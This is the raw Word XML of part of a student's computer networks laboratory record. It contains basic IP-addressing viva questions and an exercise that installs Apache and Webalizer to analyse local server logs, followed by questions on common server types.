      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="517CBFB8" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. What is an IP address?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39D3C8DD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CCDAA05" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>An IP (Internet Protocol) address is a unique numerical identifier assigned to a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49002C3A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>device so that it can communicate with other devices on a network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26AD7F91" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. What is the difference between a static IP address and a dynamic IP address?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6903B6FD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E8FF588" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A static IP address is assigned manually and remains fixed, whereas a dynamic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03CB3249" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>IP address is assigned automatically by a DHCP server and may change over</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2554BFC3" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>time.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F4D59E1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. What is a subnet mask?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="157DF5DE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1C4DF30F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A subnet mask is used to divide an IP address into network and host portions,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75723CC5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>helping devices determine whether another device is in the same network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A9245DB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. What is the purpose of a default gateway?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="188EB8CE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36546CEF" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A default gateway allows a computer to communicate with devices that are</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FE3EC35" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>outside its local network, such as the Internet.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45E98FDC" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. What happens if two computers are assigned the same IP address?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C40C643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4C02BBED" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>An IP address conflict occurs, causing communication problems and preventing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FF046CB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>proper network connectivity.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FD8AF76" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="16D03A48" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Ex.No:15</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D588BA9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>TO ANALYZE THE DIFFERENT TYPES OF SERVERS USING</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58F2B260" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>WEBALIZER TOOL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71B200DC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AIM:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54D7FF04" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>To install Webalizer and analyze server log files to study server activity</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D5F2978" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>and traffic patterns.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46C6EBCF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INTRODUCTION</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="585150C5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Webalizer is a web log analysis tool used to generate graphical reports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="429476F9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:ind w:left="259"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="264450"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from server log files. It helps in understanding server activity such as hits, visits,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54A50D64" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>requested URLs, and client usage. In this experiment, Webalizer is used to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AFF947C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>analyze logs from a web server and study how different types of server requests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19F04D1D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>are handled.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32CB12E0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>PROCEDURE :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="339FDDD6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. Update the system using sudo apt update.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="170E3901" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. Install Apache server using sudo apt install apache2 -y.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17ADA22C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. Start Apache with sudo systemctl start apache2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B333E68" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. Install Webalizer using sudo apt install webalizer -y.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77EE2678" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. Generate traffic by accessing http://localhost/ or using curl.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0646D231" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>6. Create Webalizer output directory:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65FA5A5F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>7. sudo mkdir -p /var/www/html/webalizer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5069CDAC" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>8. Run Webalizer on Apache logs:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06040D30" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>sudo webalizer -o /var/www/html/webalizer /var/log/apache2/access.log</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="647AABC6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>9.Open the browser and view the report at: http://localhost/webalizer/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="511CB3C1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03303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03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Reference output screenshot (source manual page 96)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5528D15F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="19F516AF" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:before="100" w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5267"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>RESULT :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A740400" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Webalizer was successfully installed and used to analyze the server logs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FCA5853" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>The generated reports displayed traffic details, server usage, and request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10AB70AD" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>statistics.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C0E4E61" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BE1952F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. What is Webalizer?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="482523E2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53DE8006" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Webalizer is a web server log analysis tool that generates graphical and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E247BD" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>statistical reports from server log files.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18E6E42C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. What is a server?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CCC1C89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6D6FA895" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A server is a computer or software that provides services, resources, or data to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FA33CDC" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>other computers called clients over a network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6462B0F1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. What is a log file?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="392AF27B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3FA525DC" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A log file is a file that records events, activities, and requests occurring on a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DAA4635" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>server or application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48543E90" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. Why is Webalizer used?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62F0F5F3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51184ABC" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Webalizer is used to analyze server logs and generate reports about website</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BF7F7DF" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>traffic, visitors, page views, and resource usage.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62ECFD3A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. Name some common types of servers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38BB8465" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Answer:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CD2E6DE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Some common types of servers are:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11EF93C4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F0473C3" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Web Server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D9C419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3544DF21" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>File Server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E30CBFB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10E319B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Mail Server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3891BD7C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4A1EFE09" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Database Server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22047DC2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215930D4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Application Server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75B2F514" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t></w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D70E5B7" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DNS Server</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00980B9C" w:rsidSect="00034616">
      <w:headerReference w:type="default" r:id="rId8"/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7431" w14:textId="77777777" w:rsidR="00626251" w:rsidRDefault="006262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C1A5C3" w14:textId="77777777" w:rsidR="00626251" w:rsidRDefault="006262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38AF6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:jc w:val="center"/>
      <w:rPr>
        <w:rFonts w:hint="eastAsia"/>
      </w:rPr>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:color w:val="5F6D7A"/>
        <w:sz w:val="16"/>
      </w:rPr>
      <w:t>RAGHU NANDHAN A  •  2116251901130  •  CSE CS</w:t>
    </w:r>
    <w:r>
      <w:t xml:space="preserve">     |     Page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CD834" w14:textId="77777777" w:rsidR="00626251" w:rsidRDefault="006262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BC00BD4" w14:textId="77777777" w:rsidR="00626251" w:rsidRDefault="006262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BDDD2" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
    <w:pPr>
      <w:pStyle w:val="Header"/>
      <w:pBdr>
        <w:bottom w:val="single" w:sz="12" w:space="4" w:color="0F5267"/>
      </w:pBdr>
      <w:rPr>
        <w:rFonts w:hint="eastAsia"/>
      </w:rPr>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:b/>
        <w:color w:val="0F5267"/>
        <w:sz w:val="16"/>
      </w:rPr>
      <w:t>COMPUTER NETWORKS  |  LABORATORY RECORD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145054">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1424909734">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1855918506">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="575474590">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="189220116">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="76755605">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1039555007">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="99037493">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="13502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251"/>
    <w:rsid w:val="00980B9C"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00F87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57582"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{5986FBA6-8B20-584B-8083-43F67D5E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6324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526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52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B5772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F274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6889</Words>
  <Characters>39271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Networks Lab Manual - Raghu Nandhan A</dc:title>
  <dc:subject>Computer Networks Laboratory Record</dc:subject>
  <dc:creator>RAGHU NANDHAN A</dc:creator>
  <cp:keywords/>
  <dc:description>generated by python-docx</dc:description>
  <cp:lastModifiedBy>RAGUU NANDHAN ARUNKUMAR</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-10-16T05:34:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-16T05:34:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>